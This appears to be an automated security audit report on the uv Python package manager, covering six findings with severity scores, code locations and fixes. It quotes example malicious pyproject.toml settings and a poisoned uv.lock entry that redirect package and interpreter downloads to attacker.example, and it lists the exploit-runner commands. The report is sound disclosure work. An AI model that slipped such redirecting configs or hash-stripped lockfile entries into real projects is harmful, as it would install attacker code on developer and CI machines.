# Security Audit Report: uv Python Package Manager

**Audit Firm:** AutoFyn SignalPilot

**Audit Model:** AutoFyn Security Audit

**Target:** uv (Astral's Python package and project manager) (https://github.com/astral-sh/uv)

**Repository:** `uv`

**Commit Reviewed:** `da5f6a6967b41423fb2a61bf094adff4e403367c`

**Date:** 2026-05-28

**Status:** 6 Verified Vulnerabilities Confirmed (3 High, 2 Medium, 1 Low)

---

## Executive Summary

This report documents six findings in uv, the Rust-based Python package and project manager. Each is
judged against uv's published
[security policy](https://github.com/astral-sh/uv/blob/main/SECURITY.md), which states that
interpreter invocation, PEP 517 source builds, and installation from _requested_ package indexes are
in-scope-by-design and not vulnerabilities. We therefore do **not** report behavior that merely
restates "a project's configuration configures the project's tooling." A finding is included only
where a guarantee that should still hold under that policy does not: an integrity or transport guard
that silently degrades, a documented restriction that is unenforced at runtime, a correctness
defect, or a silent replacement of a default the user did not knowingly override.

The strongest live-confirmed issues concern integrity and transport guarantees that fail silently
for a developer who clones an untrusted repository and runs a normal uv command:

- **Committed `uv.lock` Poisoning (HIGH, UV-2026-020):** a registry wheel entry whose `hash` is
  omitted is installed with no verification; repointing its `url` to an attacker host (used
  verbatim) while leaving `source` reading `registry = "https://pypi.org/simple"` causes
  `uv sync --frozen` to fetch and install an attacker artifact over plain HTTP.
- **Silent default-index / download redirection (HIGH, UV-2026-019 / UV-2026-018):** a checked-in
  `pyproject.toml` silently replaces the default PyPI index (019) or the managed-Python download
  manifest (018) with no warning. For 018 the setting is documented `uv.toml`-only, but
  `uv_toml_only` is not enforced at runtime.
- **TLS bypass and credential disclosure (MEDIUM, UV-2026-007 / UV-2026-013):** a checked-in
  `pyproject.toml allow-insecure-host` disables TLS verification (007); a `.netrc` `default` entry
  is sent over plain HTTP to a hostile index (013).

**A note on severity.** Each CVSS score reflects the **raw technical impact** of the finding, scored
independently of uv's security policy. Where uv's policy may lead a maintainer to accept the
behavior as in-scope-by-design (UV-2026-019, UV-2026-018), this is stated explicitly as a **Policy
note** under that finding rather than baked into a lowered score. All repo-shipped findings carry
`UI:R` (the victim must clone and run uv on the attacker's repository), the legitimate ceiling that
holds them below CRITICAL.

All six findings are reproduced by scripts under `autofyn_audit/exploits/` and were verified live
against a build of the pinned commit. They can be run together via
`autofyn_audit/scripts/run_all_exploits.sh`.

---

## Evidence Types

- **Direct uv Exploit** — a proof-of-concept executed against uv's own implementation (the build of
  the pinned commit), confirming the vulnerable behavior end-to-end without any attacker-controlled
  network service.
- **Direct uv Exploit + Attacker Infrastructure** — a proof-of-concept executed against uv with an
  attacker-controlled auxiliary service (a local mock index, download server, or HTTPS endpoint with
  a self-signed certificate) standing in for the remote attacker.
- **Source-Confirmed / Partial Live** — the vulnerable code path is confirmed by source review with
  limited live probing. _No finding in this report relies on this tier; all six are Direct
  Exploits._

---

## Findings Table

| ID          | Vulnerability                                     | Severity | CVSS | Status    | Evidence                                    |
| ----------- | ------------------------------------------------- | -------- | ---- | --------- | ------------------------------------------- |
| UV-2026-019 | `pyproject.toml` Silent Default-Index Replacement | High     | 8.8  | Confirmed | Direct uv Exploit + Attacker Infrastructure |
| UV-2026-018 | `pyproject.toml` Python Downloads Redirect        | High     | 8.8  | Confirmed | Direct uv Exploit + Attacker Infrastructure |
| UV-2026-020 | Committed `uv.lock` Poisoning                     | High     | 8.1  | Confirmed | Direct uv Exploit + Attacker Infrastructure |
| UV-2026-013 | .netrc Default Credential Disclosure              | Medium   | 6.5  | Confirmed | Direct uv Exploit + Attacker Infrastructure |
| UV-2026-007 | `pyproject.toml` allow-insecure-host TLS Bypass   | Medium   | 6.4  | Confirmed | Direct uv Exploit + Attacker Infrastructure |
| UV-2026-002 | GitHub API URL Injection (Unencoded Rev)          | Low      | 3.1  | Confirmed | Direct uv Exploit + Attacker Infrastructure |

---

## Vulnerability Details

### UV-2026-019: `pyproject.toml` Silent Default-Index Replacement

**Severity:** High — CVSS 8.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`

**CWE:** CWE-829: Inclusion of Functionality from Untrusted Control Sphere

**Affected Code:** `crates/uv-settings/src/settings.rs:700-754`
(`index-url`/`extra-index-url`/`find-links` in `ResolverInstallerSchema`, no `uv_toml_only`
annotation); honored from `pyproject.toml` `[tool.uv]` via the load path at
`crates/uv-settings/src/lib.rs:165-194`.

**Description:** uv honors `index-url` from a project's `pyproject.toml` `[tool.uv]` table. The
reportable issue is not that a project may declare a custom index for its own dependencies — uv's
security policy permits installation from requested indexes — but that a checked-in `index-url`
**silently replaces the default PyPI index** for a victim who never knowingly requested it. A
developer who clones a repository and runs `uv pip install <name>` or `uv sync`, expecting `<name>`
to come from PyPI, instead resolves and downloads it from the attacker's index, with **no warning**
that the default index was overridden and no CLI flag or environment variable involved.

This was confirmed directly: inside a cloned project whose `pyproject.toml` set
`index-url = "http://localhost:<port>/simple/"`, with all `UV_INDEX*` environment variables unset
and no `-i` flag, `uv pip install <name>` issued its resolution request to the attacker index
(`GET /simple/<name>/`) and uv's only diagnostic referred generically to "the package registry." The
victim has no signal that PyPI was swapped out.

**Vulnerable Configuration:**

```toml
[tool.uv]
index-url = "http://attacker.example/simple/"
```

**Attack Scenario:** An attacker publishes (or compromises) a repository with the malicious
`pyproject.toml`. Any developer who clones it and runs a standard uv install command resolves all
packages from the attacker index instead of PyPI, with no warning.

**Proof of Concept:**

```bash
bash autofyn_audit/exploits/18_pyproject_index_injection/run_exploit.sh
```

**Policy note:** uv's SECURITY.md treats installation from _requested_ package indexes as
in-scope-by-design. A maintainer may argue a `pyproject.toml index-url` is a requested index and
decline the finding. The argument for treating it as a vulnerability is narrow and specific: the
setting **silently replaces the default PyPI index with no warning**, so a victim running
`uv pip install <name>` for a package they expect from PyPI is redirected without any signal. The
reasonable resolution is the recommendation below (warn on default-index replacement) rather than a
severity dispute.

**Impact:** Complete control over which packages are resolved and installed for any victim who
clones the repository and runs a standard uv command expecting PyPI, with no warning — i.e.
arbitrary package content on the victim's machine. `UI:R` holds it below CRITICAL.

**Remediation:** Warn prominently when the effective default index originates from a project
`pyproject.toml` rather than the CLI, environment, or user/system configuration; consider requiring
explicit confirmation before a cloned `pyproject.toml` may replace (as opposed to supplement) the
default index.

---

### UV-2026-018: `pyproject.toml` Python Downloads Redirect

**Severity:** High — CVSS 8.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`

**CWE:** CWE-494: Download of Code Without Integrity Check

**Affected Code:** `crates/uv-settings/src/settings.rs:1165-1174` (`python_downloads_json_url`,
annotated `uv_toml_only = true`); `crates/uv-settings/src/lib.rs:165-194` (the `pyproject.toml` load
path returns `Options` without calling `validate_uv_toml`); `crates/uv-settings/src/lib.rs:289-374`
(`validate_uv_toml` enforces only the inverse — rejecting _pyproject-only_ fields in a `uv.toml`);
`crates/uv-python/src/downloads.rs` (manifest scheme and hash handling).

**Description:** `python-downloads-json-url` specifies the URL of the JSON manifest of available
managed-Python downloads. It is documented as `uv.toml`-only via the `uv_toml_only = true`
annotation, but that annotation is consumed only by documentation generation
(`crates/uv-dev/src/generate_options_reference.rs`); there is no runtime guard that rejects the
setting from a project's `pyproject.toml`. The `pyproject.toml` load path deserializes `[tool.uv]`
straight into `Options` and returns it without validation, so a checked-in
`[tool.uv] python-downloads-json-url` is honored when a victim clones the repository and runs a
command that triggers a managed-Python download. The manifest fetch accepts plain `http://`, the
per-entry `sha256` is optional, and when `sha256` is absent uv performs no hash verification on the
downloaded interpreter archive before invoking it.

**Vulnerable Configuration:**

```toml
[tool.uv]
python-downloads-json-url = "http://attacker.example/python.json"
```

**Attack Scenario:** A victim clones a repository carrying the malicious `pyproject.toml` and runs
`uv python install` / `uv sync` / `uv run`. uv fetches the interpreter manifest from the attacker
URL over unauthenticated HTTP, downloads an interpreter archive with `sha256: null` (no integrity
check), installs it, and executes it.

**Proof of Concept:**

```bash
bash autofyn_audit/exploits/17_pyproject_python_downloads/run_exploit.sh
```

**Policy note:** uv's SECURITY.md treats interpreter invocation as in-scope-by-design, so the
_outcome_ (running a downloaded interpreter) alone is not a vulnerability under uv's policy. What
remains reportable independent of that policy is (a) the documented `uv_toml_only` restriction is
not enforced at runtime, and (b) the manifest has no transport/integrity floor (`http://` and
`sha256: null` accepted). A maintainer may downgrade the impact rating on policy grounds; the
enforcement gap and missing integrity floor stand regardless.

**Impact:** Cloning a repository and running a managed-Python install causes uv to fetch the
interpreter manifest from an attacker URL over unauthenticated HTTP and download an interpreter
archive with no integrity check, then execute it — i.e. attacker-chosen code runs as the victim,
contrary to the documented restriction on where the setting may be declared. `UI:R` holds it below
CRITICAL.

**Remediation:** Enforce `uv_toml_only` at runtime: reject (or ignore with a warning)
`python-downloads-json-url`, `python-install-mirror`, and `pypy-install-mirror` when they originate
from `pyproject.toml`. Require HTTPS for the manifest URL and make per-entry `sha256` mandatory.

---

### UV-2026-020: Committed `uv.lock` Poisoning

**Severity:** High — CVSS 8.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` (arguably CRITICAL
under a supply-chain framing)

**CWE:** CWE-353: Missing Support for Integrity Check

**Affected Code:** `crates/uv-types/src/hash.rs:42-46` (`HashStrategy::Verify` returns
`HashPolicy::None` for entries not in the map); `crates/uv-types/src/hash.rs:292-301` (entries with
empty digests skipped via `continue`); `crates/uv-distribution-types/src/hash.rs`
(`HashPolicy::None` matches unconditionally); `crates/uv-resolver/src/lock/mod.rs` (wheel `hash` is
`Option`; registry sources are exempt from the lockfile hash-consistency check; the wheel `url` is
consumed verbatim).

**Description:** A `uv.lock` file is committed to source control and travels with a clone. Each
locked wheel carries its own `url` and an **optional** `hash`. uv does not require a hash for
registry/URL wheel entries: under `HashCheckingMode::Verify`, `HashStrategy::from_resolution()`
skips entries with empty digests (`continue`), and `HashStrategy::get()` then returns
`HashPolicy::None` for any package not in the map. `HashPolicy::None` is satisfied by any artifact
(`Self::None => true`). The download `url` is used verbatim; the entry's `source` registry string is
only an auth/metadata label and is not used to reconstruct or constrain the URL. uv writes sha256
hashes into lockfiles by default, so a hash-less registry entry is anomalous, and `--frozen`/locked
mode is precisely the mode in which integrity should be enforced. Ecosystem lockfiles
(npm/pnpm/yarn) carry integrity hashes that a URL swap would trip; uv silently degrading to no
verification is weaker than that norm.

**Vulnerable Code (malicious lockfile entry):**

```toml
[[package]]
name = "harmless-utils"
version = "1.0.0"
source = { registry = "https://pypi.org/simple" }   # unchanged — looks normal
wheels = [
    { url = "http://attacker.example/harmless_utils-1.0.0-py3-none-any.whl" },
    # url repointed to attacker; `hash = "sha256:..."` removed
]
```

**Attack Scenario:** An attacker lands a one-line change to a committed `uv.lock` (via a merged PR
or a malicious upstream repository) — repointing the wheel `url` at a server they control and
deleting the `hash`, while leaving `source` reading `registry = "https://pypi.org/simple"`. Every
developer and CI runner that clones the repository and runs `uv sync --frozen` (or `uv run`, which
auto-syncs) downloads and installs the attacker artifact over plain HTTP.

**Proof of Concept:**

```bash
bash autofyn_audit/exploits/19_committed_lockfile_poison/run_exploit.sh
```

**Impact:** Arbitrary attacker-controlled artifacts are installed via a merged PR or a malicious
upstream repository, over unauthenticated HTTP, with no environment access, no prior code execution,
and no write access to the victim's machine. Triggering requires the victim to clone and sync the
repository (`UI:R`), which is why this is rated HIGH rather than CRITICAL.

**Remediation:** Require a hash for every registry/URL wheel entry under `Verify`/locked modes
(treat a missing hash as an error, not `HashPolicy::None`); reject lockfile wheel `url`s whose
origin does not match the entry's `source` registry, and reject plain-HTTP wheel URLs by default.

---

### UV-2026-013: .netrc Default Credential Disclosure

**Severity:** Medium — CVSS 6.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`

**CWE:** CWE-522: Insufficiently Protected Credentials

**Affected Code:** `crates/uv-auth/src/credentials.rs:206-210`
(`.or_else(|| netrc.hosts.get("default"))`); `crates/uv-auth/src/middleware.rs` (credential lookup
triggered on a 401/403/404 response; no scheme gate on the netrc path).

**Description:** When resolving credentials from `.netrc`, uv falls back to the `default` entry if
no host-specific match is found, and attaches the resulting credentials as Basic auth on a 401. The
`default` token's semantics ("use for any host") are standard, so this is not reported as misuse of
netrc. The reportable gap is narrower: uv does not require HTTPS before sending `default`-entry
credentials, so a cloned project that points uv at a hostile index (via `--extra-index-url`, or in
combination with UV-2026-007) can harvest the user's `default` credentials over plain HTTP.

**Attack Scenario:** A user (or CI pipeline) has a `.netrc` with a `default` entry. They run uv
against a project that points at an attacker index. The attacker server returns 401; uv finds no
host-specific netrc match, falls back to the `default` entry, and sends the credentials as Basic
auth over plain HTTP.

**Proof of Concept:**

```bash
bash autofyn_audit/exploits/12_netrc_default_leakage/run_exploit.sh
```

**Impact:** Full disclosure of the `.netrc` `default`-entry credentials to a remote attacker,
conditioned on the victim having a `default` entry and being pointed at a hostile index. No code
execution, no pre-owned state.

**Remediation:** Require HTTPS before sending `.netrc` `default`-entry credentials, or warn when
credentials are sourced from the `default` entry for a non-HTTPS host.

---

### UV-2026-007: `pyproject.toml` allow-insecure-host TLS Bypass

**Severity:** Medium — CVSS 6.4 `CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N`

**CWE:** CWE-295: Improper Certificate Validation

**Affected Code:** `crates/uv-settings/src/settings.rs:428-435` (`allow_insecure_host` in
`GlobalOptions`, annotated `uv_toml_only = true`); honored from `pyproject.toml` via the unvalidated
load path at `crates/uv-settings/src/lib.rs:165-194` (see UV-2026-018).

**Description:** `allow-insecure-host` disables TLS certificate verification for the listed hosts.
Like `python-downloads-json-url`, it carries the `uv_toml_only = true` annotation, which is not
enforced at runtime, so it is honored from a project's `pyproject.toml`. A developer who clones a
repository and runs `uv pip install` / `uv sync` connects to the attacker-listed host with
certificate verification disabled — with no CLI flag and no warning — enabling MITM on package and
interpreter downloads even over HTTPS. Unlike a source-selection setting, this weakens transport
security itself. On its own it does not redirect any download; it is only useful to an attacker who
also holds a network position, which caps the severity.

**Vulnerable Configuration:**

```toml
[tool.uv]
allow-insecure-host = ["attacker.example.com:443"]
```

**Attack Scenario:** A victim clones a repository whose `pyproject.toml` lists an attacker host in
`allow-insecure-host` and runs a uv command that contacts that host. uv skips TLS verification,
allowing a network-positioned attacker to MITM the connection with a self-signed certificate.

**Proof of Concept:**

```bash
bash autofyn_audit/exploits/06_pyproject_insecure_host/run_exploit.sh
```

**Impact:** Silently disables TLS certificate verification for chosen hosts from a checked-in file,
enabling MITM for a network-positioned attacker.

**Remediation:** Enforce `uv_toml_only` for `allow-insecure-host` at runtime, or emit a prominent
warning when TLS verification is disabled by a setting loaded from `pyproject.toml`.

---

### UV-2026-002: GitHub API URL Injection (Unencoded Rev)

**Severity:** Low — CVSS 3.1 `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N`

**CWE:** CWE-116: Improper Encoding or Escaping of Output

**Affected Code:** `crates/uv-git/src/resolver.rs:105` —
`format!("{github_api_base_url}/{owner}/{repo}/commits/{rev}")` interpolates the rev (from
`as_rev()`) without percent-encoding. The encoding helper `as_url_rev()`
(`crates/uv-git-types/src/reference.rs:72`) exists but is not used here.

**Description:** A git dependency rev containing characters such as `?` is inserted literally into
the GitHub API fast-path URL; e.g. `main?injected=param` becomes `.../commits/main?injected=param`,
injecting a query parameter. The response must parse as a 40-character hex SHA (`GitOid::from_str`,
`crates/uv-git-types/src/oid.rs`), so there is no data-exfiltration sink; impact is confined to
hitting unexpected endpoints and rate-limit accounting. Reported as a correctness / hardening defect
because the encoder is already present and simply not called.

**Attack Scenario:** A git dependency specifies a crafted rev containing query-string characters; uv
constructs an API request to an unintended endpoint shape.

**Proof of Concept:**

```bash
bash autofyn_audit/exploits/02_github_url_injection/run_exploit.sh
```

**Impact:** Limited — no data-exfiltration sink; confined to hitting unexpected endpoints and
rate-limit accounting.

**Remediation:** Use `as_url_rev()` (percent-encoding) at `resolver.rs:105`.

---

## Informational: requirements.txt `--index-url`

A `requirements.txt` may contain `--index-url` / `--extra-index-url`
(`crates/uv-requirements-txt/src/lib.rs:750`), which uv honors as the resolution index
(`crates/uv/src/commands/pip/install.rs`). We confirmed that this silently routes resolution to the
specified index with no warning. We do **not** report it as a vulnerability: this is documented,
pip-compatible behavior that a user explicitly opts into by running `uv pip install -r <file>`, and
a requirements file is understood to declare both what and where to install. It is noted here only
for completeness; a warning when `--index-url` overrides the default would be a reasonable hardening
step.

---

## Reproduction Instructions

### Prerequisites

- A build of uv from the pinned commit (`cargo build --bin uv`), or uv on `PATH`. The exploit
  scripts prefer `target/release/uv` or `target/debug/uv` from the repository root, falling back to
  a system `uv`.
- Python 3 (standard library only) for the local attacker servers.

### Run command (setup → run → teardown)

```bash
bash autofyn_audit/scripts/run_all_exploits.sh
```

This runs `setup.sh`, executes each exploit in sequence, prints a PASS/FAIL summary, and runs
`teardown.sh`. Each exploit is independently runnable, e.g.:

```bash
bash autofyn_audit/exploits/19_committed_lockfile_poison/run_exploit.sh
bash autofyn_audit/exploits/18_pyproject_index_injection/run_exploit.sh
bash autofyn_audit/exploits/17_pyproject_python_downloads/run_exploit.sh
```

### Docker

```bash
cd autofyn_audit
docker build -t uv-audit .
docker run --rm uv-audit bash /audit/autofyn_audit/scripts/run_all_exploits.sh
```

### Expected output

The runner prints a PASS/FAIL summary table; all six exploits report PASS and the runner exits 0
with `AUDIT RESULT: VULNERABILITY CONFIRMED`.

### Cleanup

`run_all_exploits.sh` invokes `teardown.sh` automatically (best-effort). Each exploit script also
cleans up its own attacker server, temp dirs, and capture logs via an `EXIT` trap.

---

## Conclusion

The systemic theme across the High findings is that uv's integrity and transport guarantees degrade
**silently** when a setting or artifact originates from a checked-in project file that a victim
never knowingly authored: a hash-less lockfile entry installs unverified (UV-2026-020), a checked-in
`index-url` replaces PyPI with no warning (UV-2026-019), and a documented `uv.toml`-only restriction
(`uv_toml_only`) is not enforced at runtime at all (UV-2026-018, UV-2026-007). The common
remediation pattern is the same: enforce the documented boundary at runtime, require an
integrity/transport floor, and warn the user when a security-relevant default is overridden by a
project file.

**Priority remediation order:**

1. Enforce `uv_toml_only` at runtime (fixes UV-2026-018 and UV-2026-007 at the root).
2. Require hashes for registry/URL wheel entries under locked modes and reject plain-HTTP wheel URLs
   (UV-2026-020).
3. Warn on default-index replacement sourced from `pyproject.toml` (UV-2026-019).
4. Gate `.netrc` `default`-entry credentials behind HTTPS (UV-2026-013).
5. Percent-encode the git rev in the GitHub API fast-path (UV-2026-002).

---

## Files Delivered

```
autofyn_audit/
├── Dockerfile
├── audit_report.md
├── docs/
│   ├── CVE-UV-2026-019.md
│   ├── CVE-UV-2026-018.md
│   └── CVE-UV-2026-020.md
├── scripts/
│   ├── setup.sh
│   ├── teardown.sh
│   └── run_all_exploits.sh
└── exploits/
    ├── 19_committed_lockfile_poison/run_exploit.sh
    ├── 18_pyproject_index_injection/run_exploit.sh
    ├── 17_pyproject_python_downloads/run_exploit.sh
    ├── 12_netrc_default_leakage/run_exploit.sh
    ├── 06_pyproject_insecure_host/run_exploit.sh
    └── 02_github_url_injection/run_exploit.sh
```

---

## Appendix: Code References

### UV-2026-019 (pyproject Silent Default-Index Replacement)

- `crates/uv-settings/src/settings.rs:700-754` — `index-url`/`extra-index-url`/`find-links` (no
  `uv_toml_only`)
- `crates/uv-settings/src/lib.rs:165-194` — honored from pyproject `[tool.uv]`; no warning when the
  default index is replaced

### UV-2026-018 (pyproject Python Downloads Redirect)

- `crates/uv-settings/src/settings.rs:1165-1174` — `python_downloads_json_url`, `uv_toml_only`
  (documentation only)
- `crates/uv-settings/src/lib.rs:165-194` — pyproject `[tool.uv]` parsed into `Options` and returned
  without `validate_uv_toml`
- `crates/uv-settings/src/lib.rs:289-374` — `validate_uv_toml` enforces only the inverse direction
- `crates/uv-python/src/downloads.rs` — `http`/`https` accepted, optional `sha256`, no hash check
  when absent

### UV-2026-020 (Committed uv.lock Poisoning)

- `crates/uv-types/src/hash.rs:292-301` — entries with empty digests skipped (`continue`)
- `crates/uv-types/src/hash.rs:42-46` — `HashStrategy::Verify` returns `HashPolicy::None` for
  missing entries
- `crates/uv-distribution-types/src/hash.rs` — `HashPolicy::None` matches unconditionally
  (`Self::None => true`)
- `crates/uv-resolver/src/lock/mod.rs` — wheel `hash` is `Option`; registry sources exempt from the
  hash-consistency check (`Source::Registry(..) => None`); wheel `url` consumed verbatim

### UV-2026-013 (.netrc Default Credential Disclosure)

- `crates/uv-auth/src/credentials.rs:206-210` — `.or_else(|| netrc.hosts.get("default"))`
- `crates/uv-auth/src/middleware.rs` — credential lookup on 401/403/404, no scheme gate

### UV-2026-007 (pyproject allow-insecure-host)

- `crates/uv-settings/src/settings.rs:428-435` — `allow_insecure_host`, `uv_toml_only`
  (documentation only, not enforced at runtime)

### UV-2026-002 (GitHub API URL Injection)

- `crates/uv-git/src/resolver.rs:105` — `format!()` with raw rev (`as_rev()`)
- `crates/uv-git-types/src/reference.rs:72` — `as_url_rev()` (percent-encoding) exists but unused
- `crates/uv-git-types/src/oid.rs` — `GitOid::from_str` requires a 40-char hex SHA

```

</invoke>
```
